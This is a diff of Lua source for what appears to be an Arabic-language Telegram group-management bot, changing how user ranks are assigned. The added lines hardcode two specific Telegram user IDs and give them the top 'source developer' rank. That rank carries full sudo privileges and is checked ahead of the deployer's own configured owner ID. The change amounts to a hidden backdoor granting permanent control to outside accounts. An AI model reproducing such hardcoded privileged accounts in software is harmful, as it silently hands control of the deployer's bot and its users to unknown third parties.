@@ -248,7 +248,15 @@ else
 msg.GroupActive = false
 end
 
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 879123322 then 
+msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
+msg.TheRank = 'مطور السورس 👨🏻‍✈️' 
+msg.Rank = 1
+elseif msg.sender_user_id_ == 476328331 then 
+msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
+msg.TheRank = 'مطور السورس 👨🏻‍✈️' 
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
@@ -281,7 +289,7 @@ else
 msg.TheRank = 'فقط عضو 🙍🏼‍♂️'
 msg.Rank = 11
 end
- 
+
 if msg.Rank == 1 then
 msg.SudoBase = true
 end
